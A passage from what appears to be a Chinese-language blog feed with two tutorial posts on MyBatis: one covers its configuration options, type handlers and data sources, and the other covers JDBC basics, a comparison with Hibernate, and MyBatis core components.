<li>autoMappingUnknownColumnBehavior，指定发现自动映射目标未知列（或者未知属性类型）的行为，NONE: 不做任何反应，WARNING: 输出提醒日志，FAILING: 映射失败，默认为NONE；</li>
<li>defaultStatementTimeout，设置超时时间，它决定驱动等待数据库响应的秒数；</li>
<li>mapUnderscoreToCamelCase，是否开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN 到经典 Java 属性名 aColumn 的类似映射，默认为false；</li>
<li>defaultEnumTypeHandler，指定 Enum 使用的默认 TypeHandler，默认为org.apache.ibatis.type.EnumTypeHandler；</li>
<li>returnInstanceForEmptyRow，当返回行的所有列都是空时，MyBatis默认返回null。 当开启这个设置时，MyBatis会返回一个空实例，默认为false；</li>
<li>localCacheScope，MyBatis 利用本地缓存机制（Local Cache）防止循环引用（circular references）和加速重复嵌套查询。 默认值为 SESSION，这种情况下会缓存一个会话中执行的所有查询。 若设置值为 STATEMENT，本地会话仅用在语句执行上，对相同 SqlSession 的不同调用将不会共享数据，默认为SESSION；</li>
<li>logImpl，指定日志的具体实现，比如SLF4J|LOG4J|COMMONS_LOGGING等；</li>
</ul>
<h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p>在配置映射文件中，需要指定类的全限定名，为了简化，可以声明一个简短的名称去指代它，可以在MyBatis上下文中使用。系统已经为我们定义了常用的类型，比如数值、字符串、日期、集合等。对于自定义的业务POJO，需要自定义别名。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">alias</span>=<span class="string">"role"</span> <span class="attr">type</span>=<span class="string">"com.learn.chapter2.po.Role"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>也可以通过注解方式进行，首先配置一个扫描的包，然后在类定义时添加注解@Alias(“role”)。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"com.learn.chapter2.po"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Alias</span>(<span class="string">"role"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Role</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="类型处理器"><a href="#类型处理器" class="headerlink" title="类型处理器"></a>类型处理器</h4><p>MyBatis在预处理语句中设置一个参数时，或者从结果集中取出一个值时，都会用注册了的typeHader进行处理。typeHander的作用就是将参数从javaType转化为jdbcType，或者从数据库取出结果时把jdbcType转化为javaType。</p>
<p>系统内部已经定义了常用的类型处理器，有些情况下，需要自定义。</p>
<p>MyBatis也提供了枚举类型的类型处理器，有2个转化枚举类型的typeHandler，EnumTypeHandler和EnumOrdinalTypeHandler，其中EnumTypeHandler是使用枚举字符串名称作为参数传递的，EnumOrdinalTypeHandler是使用整数下标作为参数传递的。</p>
<p>但这2个枚举类型应用不那么广泛，更多的时候，需要自定义typeHandler进行处理。</p>
<p>自定义类型处理器，首先要定义类型处理类，实现TypeHandler泛型接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SexEnumTypeHandler</span> <span class="keyword">implements</span> <span class="title">TypeHandler</span>&lt;<span class="title">Sex</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParameter</span><span class="params">(PreparedStatement ps, <span class="keyword">int</span> i, Sex sex, JdbcType jdbcType)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        ps.setInt(i, sex.getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Sex <span class="title">getResult</span><span class="params">(ResultSet rs, String name)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Sex.getSex(rs.getInt(name));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Sex <span class="title">getResult</span><span class="params">(ResultSet rs, <span class="keyword">int</span> id)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Sex.getSex(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Sex <span class="title">getResult</span><span class="params">(CallableStatement cs, <span class="keyword">int</span> id)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Sex.getSex(cs.getInt(id));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后注册自定义的TypeHandler</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">typeHandlers</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">typeHandler</span> <span class="attr">handler</span>=<span class="string">"com.qqdong.study.SexEnumTypeHandler"</span> <span class="attr">javaType</span>=<span class="string">"sex"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeHandlers</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后，在定义映射器时，指定typeHandler即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;getUser&quot; parameterType=&quot;long&quot; resultType=&quot;userMap&quot;&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line"></span><br><span class="line">&lt;resultMap id=&quot;userMap&quot; type=&quot;user&quot;&gt;</span><br><span class="line">    &lt;result column=&quot;sex&quot; property=&quot;sex&quot; typeHandler=&quot;com.qqdong.study.SexEnumTypeHandler&quot;&gt;</span><br><span class="line">&lt;/resultMap&gt;</span><br></pre></td></tr></table></figure>
<h4 id="ObjectFactory"><a href="#ObjectFactory" class="headerlink" title="ObjectFactory"></a>ObjectFactory</h4><p>当MyBatis在构建一个结果返回的时候，都会使用ObjectFactory去构建POJO，在MyBatis中可以定制自己的对象工厂。一般不用配置，使用默认的DefaultObjectFactory即可。</p>
<h4 id="插件plugin"><a href="#插件plugin" class="headerlink" title="插件plugin"></a>插件plugin</h4><p>插件比较复杂，后续单独一篇文章介绍。</p>
<h4 id="environments配置环境"><a href="#environments配置环境" class="headerlink" title="environments配置环境"></a>environments配置环境</h4><p>配置环境可以注册多个数据源，每个数据源包括基本配置和数据库事务配置。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 采用jdbc事务管理 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"autoCommit"</span> <span class="attr">value</span>=<span class="string">"false"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其中，transactionManager指定数据库事务，有3种配置方法：</p>
<ul>
<li>JDBC，采用JDBC方式管理事务，在独立编码中常常使用；</li>
<li>MANAGED，采用容器方式管理事务，在JNDI数据源中常用；</li>
<li>自定义，由使用者自定义数据库事务管理方法；</li>
</ul>
<p>dataSource标签，配置数据源连接信息，type配置对数据库连接方式，有以下几种：</p>
<ul>
<li>UNPOOLED：非连接池数据库；</li>
<li>POOLED：连接池数据库；</li>
<li>JNDI：JNDI数据源；</li>
<li>自定义数据源；</li>
</ul>
<h4 id="databaseIdProvider数据库厂商标识"><a href="#databaseIdProvider数据库厂商标识" class="headerlink" title="databaseIdProvider数据库厂商标识"></a>databaseIdProvider数据库厂商标识</h4><p>该属性的作用在于指定SQL到对应的数据库厂商提供的数据库中运行。不常用，就不介绍了。</p>
<h4 id="映射器"><a href="#映射器" class="headerlink" title="映射器"></a>映射器</h4><p>映射器是MyBatis最复杂、最核心的配置，包括参数类型、动态SQL、定义SQL、缓存信息等功能，上篇文章也演示了具体的例子，下篇文章会重点介绍细节。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[深入浅出MyBatis：JDBC和MyBatis介绍]]></title>
      <url>https://qqdong.github.io/2018/03/25/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAMyBatis%EF%BC%9AJDBC%E5%92%8CMyBatis%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<p>最近在休陪产假，时间比较零碎，准备看2本书充实下，一本是「深入浅出MyBatis：技术原理与实践」，一本是「RabbitMQ实战：高效部署分布式消息队列」，为了加深记忆和理解，会进行整理、扩展和记录。</p>
<p>看书的目标不是把所有的细节都记住，而是从整体上了解一个技术能做什么，包含的特性、基本模块，实现原理和常见使用场景。</p>
<p>本篇分享MyBatis书籍的第一篇，首先回忆下JDBC的相关概念，了解Java提供的访问数据库最基本的方式，然后介绍下MyBatis的基本特性和核心组件，最后说下书的整体结构，了解后续文章的大致内容。</p>
<a id="more"></a>
<h4 id="JDBC相关概念"><a href="#JDBC相关概念" class="headerlink" title="JDBC相关概念"></a>JDBC相关概念</h4><p>Java程序都是通过JDBC连接数据库的，通过SQL对数据库编程，JDBC是由SUN公司提出的一些列规范，只定义了接口规范，具体实现由各个数据库厂商去实现，它是一种典型的桥接模式。</p>
<blockquote>
<p>桥接模式是一种结构型设计模式，它的主要特点是把抽象与行为实现分离开来，分别定义接口，可以保持各部分的独立性以及应对他们的功能扩展。</p>
</blockquote>
<h5 id="JDBC规范"><a href="#JDBC规范" class="headerlink" title="JDBC规范"></a>JDBC规范</h5><p>所谓规范，就是自己定义了标准接口，做了如下抽象：用Connection代表和数据库的连接，用Statement执行SQL，用ResultSet表示SQL返回的结果，提供了对数据的便利。从Connection可以创建Statement，Statement执行查询得到ResultSet。</p>
<p>上面说的Connection、Statement、ResultSet都应该是接口，具体实现由各个数据库提供商提供。有了规范，可以通过统一的接口，访问多种类型的数据库，可随便切换数据库。</p>
<h5 id="数据库驱动"><a href="#数据库驱动" class="headerlink" title="数据库驱动"></a>数据库驱动</h5><p>上面提到，接口的实现由各个厂商提供，那么实现类的类名就会不统一，去创建Connection对象时，代码就会写死某个实现类，切换数据库时，就需要修改代码，这样不太好。为了解决这个问题，抽象了Driver驱动的概念。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection con=MySqlConnectionImpl(<span class="string">"127.0.0.1"</span>,<span class="number">3306</span>,<span class="string">"mi_user"</span>,userName,pwd);</span><br></pre></td></tr></table></figure>
<p>每个数据库都需要实现Driver接口，通过Driver可获得数据库连接Connection，通过反射机制动态创建。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">"com.mysql.jdbc.Drier"</span>);</span><br></pre></td></tr></table></figure>
<p>同一个程序可能访问不同的数据库，通过DriverManager来管理驱动，Driver在初始化的时候，需要注册到DriverManager中。</p>
<p>DriverManager提供了一个getConnection方法，用于建立数据库Connection：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connection con=DriverManager.getConnection(<span class="string">"127.0.0.1"</span>,<span class="number">3306</span>,<span class="string">"mi_user"</span>,userName,pwd);</span><br></pre></td></tr></table></figure>
<p>如果有多个数据库驱动，DriverManager如何区分呢，需要在数据库连接url中指定，比如mysql需要添加jdbc:mysql前缀：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String url= <span class="string">"jdbc:mysql://127.0.0.1:3306/mi_user"</span>;</span><br><span class="line">Connection con=DriverManager.getConnection(url,userName,pwd);</span><br></pre></td></tr></table></figure>
<h5 id="数据源"><a href="#数据源" class="headerlink" title="数据源"></a>数据源</h5><p>数据源DataSource包含连接池和连接池管理2个部分，习惯上称为连接池。在系统初始化的时候，将数据库连接作为对象存储在内存中，当需要访问数据库时，从连接池中取出一个已建立的空闲连接对象。</p>
<p>使用数据源，获取其DataSource对象，通过该对象动态的获取数据库连接。另外，DataSource对象可以注册到名字服务(JNDI)中，可以通过名字服务获得DataSource对象，无需硬性编码驱动。</p>
<p>DriverManager是JDBC1提供的，DataSource是JDBC2新增的功能，提供了更好的连接数据源的方法。</p>
<h4 id="对比Hibernate和MyBatis"><a href="#对比Hibernate和MyBatis" class="headerlink" title="对比Hibernate和MyBatis"></a>对比Hibernate和MyBatis</h4><p>通过上面的介绍，传统的JDBC编程给我们带来了连接数据库的功能，但其工作量相对较大，首先连接，然后处理JDBC底层事务，处理数据类型，还要对可能产生的异常进行捕捉处理并正确的关闭资源。</p>
<p>实际工作中，很少使用JDBC进行编程，提出了ORM模型，主要解决数据库数据和POJO对象的相互映射。</p>
<p>Hibernate和Mybatis都是ORM模型，Hibernate提供的是一种全表映射的模型，对JDBC的封装程度比较高。但Hibernate也有不少缺点，列举如下：</p>
<ul>
<li>全表映射带来的不便，比如更新时需要发送所有的字段；</li>
<li>无法根据不同的条件组装不同的SQL；</li>
<li>对多表关联和复杂SQL查询支持较差，需要自己写SQL，返回后，需要自己将数据组装为POJO；</li>
<li>不能有效支持存储过程；</li>
<li>虽然有HQL，但性能较差，大型互联网系统往往需要优化SQL，而Hibernate做不到。</li>
</ul>
<p>大型互联网环境中，灵活、SQL优化，减少数据的传递是最基本的优化方法，Hibernate无法满足要求，而MyBatis提哦给你了灵活、方便的方式，是一个半自动映射的框架。</p>
<p>MyBatis需要手工匹配提供POJO、SQL和映射关系，而全表映射的Hibernate只需要提供POJO和映射关系。</p>
<p>MyBatis可以配置动态SQL，可以解决Hibernate的表名根据时间变化，不同的条件下列明不一样的问题。可以优化SQL，通过配置决定SQL映射规则，也能支持存储过程，对于一些复杂和需要优化性能的SQL的查询它更加方便。</p>
<h4 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h4><p>核心组件主要包括以下几个：</p>
<ul>
<li>SqlSessionFactoryBuilder：会根据配置信息或代码来生成SqlSessionFactory；</li>
<li>SqlSessionFactory：依靠工厂来生成SqlSession；</li>
<li>SqlSession：是一个既可以发送SQL去执行并返回结果，也可以获取Mapper的接口；</li>
<li>SQL Mapper：是MyBatis新设计的组件，由一个Java接口和XML文件构成，需要给出对应的SQL和映射规则。它负责发送SQL去执行，并返回结果。</li>
</ul>
<h5 id="构建SqlSessionFactory"><a href="#构建SqlSessionFactory" class="headerlink" title="构建SqlSessionFactory"></a>构建SqlSessionFactory</h5><p>每个MyBatis应用都是以SqlSessionFactory的实例为中心的，它的任务是创建SqlSession。SqlSesion类似于一个JDBC的Connection对象。</p>
<p>提供了2种方式创建SqlSessionFactory：一种是XML配置的方式，一种是代码的方式，推荐使用XML配置的方式。</p>
<p>定义mybatis-config.xml文件如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta"> PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta"> "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">"application.properties"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">&lt;!-- 定义别名 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">typeAlias</span> <span class="attr">alias</span>=<span class="string">"role"</span> <span class="attr">type</span>=<span class="string">"com.learn.chapter2.po.Role"</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">&lt;!-- 定义数据库信息.默认使用development数据库构建环境 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">"development"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 采用jdbc事务管理 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">"JDBC"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">"POOLED"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driver"</span> <span class="attr">value</span>=<span class="string">"$&#123;driver&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">&lt;!-- 定义映射器 --&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">resource</span>=<span class="string">"com\learn\chapter2\mapper\roleMapper.xml"</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>创建SqlSessionFactory</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String resource = <span class="string">"mybatis-config.xml"</span>;</span><br><span class="line">InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">SqlSessionFactory  sqlSessionFactory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputStream);</span><br></pre></td></tr></table></figure>
<h5 id="创建SqlSession"><a href="#创建SqlSession" class="headerlink" title="创建SqlSession"></a>创建SqlSession</h5><p>SqlSession是一个接口类，扮演者门面的作用，真正干活的是Executor接口。需要保证每次用完正常关闭它。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SqlSession sqlSession=<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    sqlSession=sqlSessionFactory.openSession();</span><br><span class="line">    <span class="comment">//some code</span></span><br><span class="line">    sqlSession.commit();</span><br><span class="line">&#125; <span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">    sqlSession.roolback();</span><br><span class="line">&#125; <span class="keyword">finally</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sqlSession!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        sqlSession.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="映射器"><a href="#映射器" class="headerlink" title="映射器"></a>映射器</h5><p>映射器是由Java接口和XML文件（或注解）共同组成的，作用如下：</p>
<ul>
<li>定义参数类型</li>
<li>描述缓存</li>
<li>描述SQL语句</li>
<li>定义查询结果和POJO的映射关系</li>
</ul>
<p>首先，定义Java接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RoleMapper</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Role <span class="title">getRole</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后，定义映射XML文件，RoleMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE configuration</span></span><br><span class="line"><span class="meta"> PUBLIC "-//mybatis.org//DTD Config 3.0//EN"</span></span><br><span class="line"><span class="meta"> "http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span> =<span class="string">"com.learn.chapter2.mapper.RoleMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getRole"</span> <span class="attr">paramterType</span>=<span class="string">"long"</span> <span class="attr">resultType</span>=<span class="string">"role"</span> &gt;</span></span><br><span class="line">        select id,role_name as roleName , note from t_role where id=#&#123;id&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>POJO对象Role的定义比较简单，就不列出了。#{id}为这条SQL的参数，SQL列的别名和POJO的属性名称保持一致，会把这条语句的查询结果自动映射到Role属性上，这就是自动映射。</p>
<p>执行查询</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RoleMapper roleMapper=sqlSession.getMapper(RoleMapper.class);</span><br><span class="line">Role role=roleMapper.getRole(<span class="number">1L</span>);</span><br><span class="line">String roleName=role.getRoleName();</span><br></pre></td></tr></table></figure>
<h5 id="组件生命周期"><a href="#组件生命周期" class="headerlink" title="组件生命周期"></a>组件生命周期</h5><p>SqlSessionFactory在MyBatis应用的整个生命周期中，每个数据库只对应一个SqlSessionFactory，可以实现一个工具类，以单例模式获取该对象。</p>
<p>SqlSession的生命周期在请求数据库处理事务的过程中，它是一个线程不安全的对象，在涉及多线程的时候要特别当心。它存活于一个应用的请求和操作，可以执行多条SQL，保证事务的一致性。</p>
<p>Mapper的作用是发送SQL，然后返回需要的结果，或者执行SQL修改数据库的数据，所以它应该在一个SqlSession事务方法之内，如同JDBC中一条SQL语句的执行，它最大的范围和SqlSession是相同的。</p>
<h4 id="书的整体结构"><a href="#书的整体结构" class="headerlink" title="书的整体结构"></a>书的整体结构</h4><p>本书分为3个部分，依次介绍了MyBatis的基础应用、原理及插件开发、实战应用。</p>
<h5 id="基础应用"><a href="#基础应用" class="headerlink" title="基础应用"></a>基础应用</h5><p>主要介绍如何高效地使用MyBatis：</p>
<ul>
<li>MyBatis特性</li>
<li>核心组件及其生命周期</li>
<li>MyBatis配置</li>
<li>映射器</li>
<li>动态SQL</li>
</ul>
<h5 id="MyBatis原理"><a href="#MyBatis原理" class="headerlink" title="MyBatis原理"></a>MyBatis原理</h5><p>深入源码理解MyBatis的内部运行原理以及插件的开发方法和技巧：</p>
<ul>
<li>介绍MyBatis的解析和运行原理，将了解到SqlSession的构建方法，以及四大对象是如何工作的</li>
<li>介绍MyBatis的插件</li>
</ul>
<h5 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h5><p>主要讲解MyBatis的一些实用的场景：</p>
<ul>
<li>介绍MyBatis-Spring，讲解如何在Spring项目中集成MyBatis应用</li>
<li>介绍MyBatis的实用场景，精选一些典型场景，解析每个场景下，开发人员需要注意避免的一些错误和性能上的损失</li>
</ul>
<p>下篇会介绍MyBatis的相关配置，更好的配置MyBatis以适用于不同的业务场景，以及提供给我们的扩展。</p>
<p><div align="center"><br><img src="http://upload-images.jianshu.io/upload_images/115629-5a140433dc5e61ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="情情说"></div></p>
]]></content>
      
        <categories>
            
            <category> MyBatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MyBatis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[小曼老师]]></title>
